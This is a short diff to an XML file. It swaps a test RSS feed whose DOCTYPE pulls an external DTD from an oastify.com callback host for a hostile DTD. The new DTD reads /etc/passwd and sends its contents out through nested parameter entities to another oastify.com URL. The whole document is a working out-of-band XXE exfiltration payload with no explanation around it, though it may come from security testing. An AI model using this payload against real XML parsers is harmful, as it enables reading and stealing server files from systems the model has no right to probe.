@@ -1,11 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "https://xz07zaflud2r0eyfqa1mn3ipxg37ryfn.oastify.com/evil.dtd">
-  %xxe;
-]>
-<rss version="2.0">
-  <channel>
-    <title>Test</title>
-    <description>Test</description>
-  </channel>
-</rss>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://vji5j8zjebmpkcida8lk712nhen5bxzm.oastify.com/?data=%file;'>">
+%eval;
+%exfil;
